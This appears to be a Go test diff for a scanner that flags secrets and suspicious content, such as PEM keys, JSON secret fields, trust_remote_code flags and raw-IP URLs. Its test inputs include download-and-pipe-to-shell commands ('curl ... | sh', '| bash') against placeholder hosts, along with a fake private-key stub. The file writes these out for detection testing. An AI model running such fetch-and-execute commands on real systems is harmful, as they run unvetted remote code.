@@ -1054,3 +1054,86 @@ func TestJSONCredentialPropertyKeySpellings(t *testing.T) {
 		}
 	}
 }
+
+func TestPEMPrivateKeySurvivesPlaceholderFilter(t *testing.T) {
+	pem := "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA0123456789abcdef\n-----END RSA PRIVATE KEY-----\n"
+	var found bool
+	for _, h := range hitsFor(t, pem) {
+		if h.Rule.ID == "SC4N-STRING-SECRET-VALUE" && h.Redacted {
+			found = true
+		}
+	}
+	if !found {
+		t.Fatalf("multi-line PEM private key was dropped by placeholder filter: %+v", hitsFor(t, pem))
+	}
+}
+
+func TestJSONSecretNamesNormalized(t *testing.T) {
+	for _, doc := range []string{
+		`{"client_secret": "correct-Horse-battery9"}`,
+		`{"access_token": "correct-Horse-battery9"}`,
+		`{"auth_token": "correct-Horse-battery9"}`,
+		`{"private_key": "correct-Horse-battery9"}`,
+	} {
+		var found bool
+		for _, h := range hitsFor(t, doc) {
+			if h.Rule.ID == "SC4N-STRING-SECRET-VALUE" && h.Extra["kind"] == "secret-json" && h.Redacted {
+				found = true
+			}
+		}
+		if !found {
+			t.Errorf("%s: normalized JSON secret key was not reported", doc)
+		}
+	}
+}
+
+func TestTrustRemoteCodeFalseDoesNotEmitMetadataCode(t *testing.T) {
+	for _, h := range hitsFor(t, `{"trust_remote_code": false}`) {
+		if h.Rule.ID == "SC4N-METADATA-CODE" || h.Rule.ID == "SC4N-STRING-LOADER-FLAG" {
+			t.Fatalf("trust_remote_code: false falsely emitted %s: %+v", h.Rule.ID, h)
+		}
+	}
+	for _, in := range []string{"trust_remote_code=True", "trust_remote_code: true"} {
+		if !containsRule(hitsFor(t, in), "SC4N-STRING-LOADER-FLAG") {
+			t.Errorf("%q did not emit SC4N-STRING-LOADER-FLAG", in)
+		}
+	}
+}
+
+func TestACClassTableLeavesZeroReserved(t *testing.T) {
+	for _, ind := range indicatorTable {
+		lit := strings.ToLower(ind.literal)
+		for i := 0; i < len(lit); i++ {
+			if automaton.class[lit[i]] == 0 {
+				t.Fatalf("byte %q in indicator %q was assigned unknown class 0", lit[i], ind.literal)
+			}
+		}
+	}
+	if automaton.class[0x00] != 0 {
+		t.Fatalf("unused NUL byte got non-zero class %d", automaton.class[0x00])
+	}
+}
+
+func TestRawIPURLUserinfoAndPipeDownloadEdgeCases(t *testing.T) {
+	for _, u := range []string{
+		"http://user:pass@192.0.2.1/payload",
+		"http://example.com@198.51.100.7:8080/x",
+		"https://alice@[2001:db8::1]/x",
+	} {
+		if !containsRule(hitsFor(t, u), "SC4N-STRING-RAW-IP-URL") {
+			t.Errorf("URL with userinfo %q missed SC4N-STRING-RAW-IP-URL", u)
+		}
+	}
+	for _, cmd := range []string{
+		"CURL -s https://example.invalid/p | sh",
+		"curl -fsSL https://example.invalid/p \\\n  | bash",
+	} {
+		if !containsRule(hitsFor(t, cmd), "SC4N-STRING-SHELL") {
+			t.Errorf("download pipe %q missed SC4N-STRING-SHELL", cmd)
+		}
+	}
+	// Lowercase-hyphenated prose starting with sk- must not fire secret-token.
+	if containsRule(hitsFor(t, "using sk-learn-classification-model for inference"), "SC4N-STRING-SECRET-VALUE") {
+		t.Fatal("sk-learn-classification-model falsely reported as a secret token")
+	}
+}
